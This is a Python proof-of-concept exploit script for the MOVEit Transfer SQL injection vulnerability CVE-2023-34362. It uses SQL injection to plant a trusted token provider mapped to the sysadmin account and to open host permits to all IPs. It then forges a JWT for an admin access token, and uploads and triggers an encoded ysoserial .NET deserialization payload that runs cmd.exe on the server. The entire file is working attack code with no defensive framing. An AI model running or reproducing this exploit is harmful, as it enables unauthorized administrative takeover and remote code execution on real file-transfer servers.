#!/usr/bin/python3

import argparse
import base64
import datetime
import hashlib
import json
import requests
import re
import sys
import jwt
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def get_csrf(s: requests.Session, url: str) -> Optional[str]:
    data = {"Arg06": "123"}
    r = s.post(f"{url}/guestaccess.aspx", data=data, verify=False)
    body = r.text
    match = re.search(r'name="csrftoken" value="([^"]*)"', body)
    if match:
        return match.group(1)
    else:
        return None


def dict_to_session_var_dict(d: dict) -> dict:
    s = dict()
    for i, k in enumerate(d):
        s[f"X-siLock-SessVar{i}"] = f"{k}: {d[k]}"
    return s


def set_session_variables(s: requests.Session, session_vars: dict, url: str) -> None:
    headers = {
        "xx-silock-transaction": "folder_add_by_path",
        "X-siLock-Transaction": "session_setvars",
    }
    headers.update(dict_to_session_var_dict(session_vars))
    s.post(f"{url}/moveitisapi/moveitisapi.dll?action=m2", headers=headers, verify=False)


def get_session_id(s: requests.Session, url: str) -> str:
    r = s.get(url, verify=False)
    return r.cookies['ASP.NET_SessionId']


def do_guest_access(s: requests.Session, csrf: str, url: str):
    data = {
        "CsrfToken": csrf,
        "transaction": "secmsgpost",
        "Arg01": "email_subject",
        "Arg04": "email_body",
        "Arg06": "123",
        "Arg05": "send",
        "Arg08": "email@example.com",
        "Arg09": "attachment_list"
    }
    s.post(f"{url}/guestaccess.aspx", data=data, verify=False)


def do_injection(sql_statements: list[str], s: requests.Session, csrf: str, url: str):
    for statement in sql_statements:
        if "," in statement:
            raise Exception(f"SQL statement '{statement} contains a comma. Refactor your statement to remove the comma.\n")
        session_vars = {
            "MyPkgID": "0",
            "MyPkgSelfProvisionedRecips": f"SQL Injection'); {statement} -- asdf",
        }
        set_session_variables(s, session_vars, url)
        do_guest_access(s, csrf, url)


def create_jwt(amurl: str):
    with open("./key.pem", 'r') as f:
        private_key = f.read()

    with open('cert.crt', 'rb') as cert_file:
        cert_data = cert_file.read()
        cert = x509.load_pem_x509_certificate(cert_data, default_backend())
        der = cert.public_bytes(serialization.Encoding.DER)
        sha1 = hashlib.sha1(der).digest()
        x5t = base64.urlsafe_b64encode(sha1).rstrip(b'=')

    headers = {'x5t': x5t.decode()}
    payload = {
        "sub": "1234567890",
        "name": "John Doe",
        "iat": 1516239022,
        'exp': datetime.datetime.utcnow() + datetime.timedelta(minutes=5),
        'aud': 'https://prgsftoutlookaddintest.z14.web.core.windows.net/readDialog.html',
        "appctx": {"msexchuid": "exchange", "Version": "ExIdTok.V1", "amurl": amurl}
    }

    return jwt.encode(payload, private_key, algorithm='RS256', headers=headers)


def get_access_token(encoded_jwt: str, url: str) -> str:
    data = {
        "grant_type": "external_token",
        "external_token_type": "MicrosoftOutlook",
        "external_token": encoded_jwt,
        "language": "en",
    }
    resp = requests.post(f"{url}/api/v1/auth/token", data=data, verify=False)
    return resp.json()["access_token"]


def delete_file(url, access_token, file_id):
    h = {"Authorization": f"Bearer {access_token}"}
    resp = requests.delete(f"{url}/api/v1/files/{file_id}", headers=h, verify=False)
    if resp.status_code == 204:
        print("[*] Uploaded file deleted")
    else:
        print("[-] Failed to delete uploaded file")


def get_folder_id(url, access_token):
    h = {"Authorization": f"Bearer {access_token}"}
    resp = requests.get(f"{url}/api/v1/folders", headers=h, verify=False)
    items = resp.json().get("items")
    if items:
        folder_id = items[0]["id"]
        return folder_id
    else:
        print("[-] Failed to get FolderID")
        sys.exit()


def start_upload(url, access_token, folder_id):
    payload = "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAFIvYyBjbWQuZXhlIC9DIGVjaG8gRElSVFkgTUlLRSBBTkQgVEhFIEJPWVMgV0VSRSBIRVJFID4gQzpcV2luZG93c1xUZW1wXG1lc3NhZ2UudHh0BgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs="
    p = {
        "uploadType": "resumable"
    }
    d = {
        "name": "letusin",
        "size": "0",
        "comments": payload
    }
    h = {
        "Authorization": f"Bearer {access_token}",
    }
    resp = requests.post(f"{url}/api/v1/folders/{folder_id}/files", headers=h, params=p, files=d, verify=False)
    j = resp.json()
    file_id = j.get("fileId")
    if file_id:
        print(f"[*] Got FileID: {file_id}")
        return file_id
    else:
        print(f"[-] Failed to get FileID! Try changing the file name.")
        sys.exit()

def inject_payload(sess, url, csrf, file_id):
    # SQL inject the ysoserial .NET payload
    print("[*] Injecting the payload")
    payload_statements = [
        f"UPDATE `fileuploadinfo` SET `State` = `Comment` WHERE `FileID` = {file_id};"
    ]
    do_injection(payload_statements, sess, csrf, url)
    print("[*] Payload injected")

def trigger_payload(url, access_token, folder_id, file_id):
    print("[*] Triggering payload via resume call")
    p = {
        "uploadType": "resumable",
        "fileId": file_id
    }
    h = {
        "Authorization": f"Bearer {access_token}",
    }
    resp = requests.put(f"{url}/api/v1/folders/{folder_id}/files", headers=h, params=p, verify=False)
    if 'Internal Server Error' in resp.text:
        print("[+] Triggered the payload!")
    else:
        print("[-] Failed to trigger the payload")
        sys.exit()

def parse_args():
    parser = argparse.ArgumentParser(description="POC for MOVEit Transfer CVE-2023-34362")
    parser.add_argument('-u', '--url', type=str, help='The URL of the MOVEit Transfer target')
    parser.add_argument('-p', '--provider', type=str, help='Provider address used for authentication callback')
    return parser.parse_args()

def main():
    args = parse_args()
    s = requests.Session()
    session_id = get_session_id(s, args.url)

    # Setup session vars to get correct CSRF
    session_vars = {
        "MyUsername": "Guest",
        "MyPkgAccessCode": "123",
        "MyGuestEmailAddr": "my_guest_email@example.com",
    }
    set_session_variables(s, session_vars, args.url)

    csrf = get_csrf(s, args.url)

    # Create our SQL injection statements
    provider = args.provider
    token_id = f"exchange__{provider}"
    comment = "LetUsIn"
    sql_statements = [
        f"INSERT INTO `userexternaltokens` (`TokenId`) VALUES ('{token_id}');",
        f"UPDATE `userexternaltokens` SET `InstID` = 0 WHERE `TokenId` = '{token_id}';",
        f"UPDATE `userexternaltokens` SET `TokenType` = '' WHERE `TokenId` = '{token_id}';",
        f"UPDATE `userexternaltokens` INNER JOIN `users` ON users.LoginName = 'sysadmin' SET userexternaltokens.UserName = users.UserName WHERE userexternaltokens.TokenId = '{token_id}';",

        # Allow logins with external IP
        f"INSERT INTO `hostpermits` (`Comment`) VALUES ('{comment}');",
        f"UPDATE `hostpermits` SET `InstID` = 0 WHERE `Comment` = '{comment}';",
        f"UPDATE `hostpermits` SET `Rule` = 1 WHERE `Comment` = '{comment}';",
        f"UPDATE `hostpermits` SET `Host` = '*.*.*.*' WHERE `Comment` = '{comment}';",
        f"UPDATE `hostpermits` SET `PermitID` = 3 WHERE `Comment` = '{comment}';",
        f"UPDATE `hostpermits` SET `Priority` = 1 WHERE `Comment` = '{comment}';",

        # Add a trusted external token provider
        f"INSERT INTO `trustedexternaltokenproviders` (`ProviderURL`) VALUES ('{provider}');",
        f"UPDATE `trustedexternaltokenproviders` SET `InstID` = 0 WHERE `ProviderURL` = '{provider}';",
        f"UPDATE `trustedexternaltokenproviders` SET `ProviderName` = 'moveit' WHERE `ProviderURL` = '{provider}';"
    ]

    do_injection(sql_statements, s, csrf, args.url)

    encoded_jwt = create_jwt(args.provider)

    access_token = get_access_token(encoded_jwt, args.url)
    print(f"[*] Access token: {access_token}")

    # Clean up our database modifications
    cleanup_statements = [
        # Remove our external token
        f"DELETE FROM `userexternaltokens` WHERE `TokenId` = '{token_id}';",

        # Remove our host permits rule
        f"DELETE FROM `hostpermits` WHERE `Comment` = '{comment}';",

        # Remove our trusted external token provider
        f"DELETE FROM `trustedexternaltokenproviders` WHERE `ProviderURL` = '{provider}';"
    ]
    do_injection(cleanup_statements, s, csrf, args.url)

    folder_id = get_folder_id(args.url, access_token)
    print(f"[*] Folder ID: {folder_id}")

    file_id = start_upload(args.url, access_token, folder_id)
    inject_payload(s, args.url, csrf, file_id)

    trigger_payload(args.url, access_token, folder_id, file_id)

    delete_file(args.url, access_token, file_id)


if __name__ == '__main__':
    main()
